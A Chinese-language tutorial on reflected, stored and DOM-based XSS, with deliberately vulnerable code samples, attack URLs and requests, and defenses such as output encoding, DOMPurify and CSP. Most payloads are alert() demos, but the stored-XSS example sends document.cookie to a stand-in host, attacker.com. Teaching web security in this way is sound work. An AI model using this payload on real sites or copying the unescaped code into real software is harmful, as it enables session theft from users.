以下是 反射型 XSS、存储型 XSS 和 DOM 型 XSS 的典型示例，涵盖攻击场景、代码实现及防御方法：

一、反射型 XSS（Reflected XSS）
特点：恶意脚本通过 URL 参数或 HTTP 请求直接反射到响应中，浏览器执行脚本。
常见场景：搜索页面、错误提示、链接跳转等。

示例 1：搜索页面反射 XSS
攻击 URL：

https://example.com/search?q=<script>alert('XSS')</script>
服务器代码（PHP 示例）：

php
<?php
// 未过滤用户输入，直接输出到 HTML
$search = $_GET['q'];
echo "<h1>搜索结果: " . $search . "</h1>";
?>
攻击效果：
用户访问攻击 URL 后，浏览器执行 <script>alert('XSS')</script>，弹出警告框。

示例 2：错误提示反射 XSS
攻击 URL：

https://example.com/login?error=<img src=x onerror=alert('XSS')>
服务器代码（Node.js 示例）：

javascript
app.get('/login', (req, res) => {
    const error = req.query.error; // 未过滤用户输入
    res.send(`<div class="error">${error}</div>`);
});
攻击效果：
用户访问攻击 URL 后，<img> 标签的 onerror 事件触发 alert('XSS')。

防御方法：
输入过滤：拒绝包含 <script>、onerror= 等危险字符的输入。
输出编码：对输出到 HTML 的内容进行 HTML 实体编码（如 < → &lt;）。
php
echo "<h1>搜索结果: " . htmlspecialchars($search, ENT_QUOTES) . "</h1>";
二、存储型 XSS（Stored XSS）
特点：恶意脚本存储在服务器数据库中，其他用户访问时触发执行。
常见场景：评论区、留言板、用户资料等。

示例 1：评论区存储 XSS
攻击请求：

http
POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

content=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
服务器代码（Python Flask 示例）：

python
from flask import Flask, request, render_template
app = Flask(__name__)

@app.route('/comment', methods=['POST'])
def add_comment():
    comment = request.form['content']  # 未过滤用户输入，直接存入数据库
    # 假设存入数据库后，其他用户访问 /comments 会读取并显示
    return "评论已发布！"

@app.route('/comments')
def show_comments():
    # 从数据库读取评论并渲染到模板（未编码）
    comments = ["<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"]
    return render_template('comments.html', comments=comments)
攻击效果：
其他用户访问 /comments 时，浏览器执行脚本，将 Cookie 发送到攻击者服务器。

示例 2：用户资料存储 XSS
攻击请求：

http
POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

nickname=<svg/onload=alert('XSS')>
服务器代码（Java Spring 示例）：

java
@PostMapping("/profile")
public String updateProfile(@RequestParam String nickname, Model model) {
    // 未过滤用户输入，直接存入数据库
    userService.updateNickname(nickname);
    return "redirect:/profile";
}

@GetMapping("/profile")
public String showProfile(Model model) {
    String nickname = userService.getNickname(); // 从数据库读取
    model.addAttribute("nickname", nickname); // 未编码直接渲染到 Thymeleaf 模板
    return "profile";
}
攻击效果：
用户访问自己的资料页时，<svg/onload=alert('XSS')> 触发弹窗。

防御方法：
输入过滤：拒绝包含 <script>、onload= 等危险字符的输入。
输出编码：对输出到 HTML 的内容进行 HTML 实体编码。
python
# Flask 示例：使用 Jinja2 自动转义
return render_template('comments.html', comments=[html.escape(comment)])
存储时净化：使用库（如 OWASP Java HTML Sanitizer）净化输入。
三、DOM 型 XSS（DOM-Based XSS）
特点：恶意脚本通过 JavaScript 动态修改 DOM 触发，不经过服务器（纯前端漏洞）。
常见场景：前端路由、动态内容加载、URL 参数处理等。

示例 1：URL 参数动态修改 DOM
攻击 URL：

https://example.com/#<img src=x onerror=alert('XSS')>
前端代码（JavaScript 示例）：

javascript
// 危险：直接使用 URL 参数修改 DOM
const hash = window.location.hash.substring(1); // 获取 # 后的内容
document.getElementById("content").innerHTML = hash; // 执行恶意脚本
攻击效果：
用户访问攻击 URL 后，<img> 标签的 onerror 触发弹窗。

示例 2：前端路由拼接 HTML
攻击 URL：

https://example.com/user?id=<script>alert('XSS')</script>
前端代码（React 示例）：

javascript
// 危险：直接使用 URL 参数拼接 HTML（即使使用 React 也需注意）
function UserPage() {
    const params = new URLSearchParams(window.location.search);
    const userId = params.get('id');
    return <div dangerouslySetInnerHTML={{ __html: userId }} />; // React 的危险 API
}
攻击效果：
用户访问攻击 URL 后，脚本直接执行。

示例 3：动态加载 JSON 数据
攻击请求：

http
GET /api/data?callback=alert('XSS') HTTP/1.1
Host: example.com
前端代码（JSONP 示例）：

javascript
// 危险：未验证 callback 名称，直接执行
function loadData() {
    const script = document.createElement('script');
    script.src = `/api/data?callback=${encodeURIComponent(window.location.search.split('=')[1])}`;
    document.body.appendChild(script);
}
攻击效果：
攻击者构造 URL ?callback=alert('XSS')，导致脚本执行。

防御方法：
避免直接操作 DOM：使用 textContent 代替 innerHTML。
javascript
document.getElementById("content").textContent = hash; // 安全
使用安全库：如 DOMPurify 净化输入。
javascript
import DOMPurify from 'dompurify';
document.getElementById("content").innerHTML = DOMPurify.sanitize(hash);
严格验证 URL 参数：拒绝包含 <script>、onerror= 等字符的输入。
禁用 JSONP：改用 CORS 跨域请求。
总结对比
类型	数据来源	触发时机	防御重点
反射型 XSS	URL 参数/HTTP 请求	服务器响应后	输入过滤 + 输出编码
存储型 XSS	服务器数据库	其他用户访问时	存储净化 + 输出编码
DOM 型 XSS	前端动态数据	浏览器解析 DOM 时	避免直接操作 DOM + 使用安全库
通用防御原则：

永不信任用户输入：所有数据需验证、过滤、编码。
最小权限原则：限制脚本执行权限（如 CSP、HttpOnly Cookie）。
使用安全框架：如 React/Vue 的自动转义、DOMPurify 等。
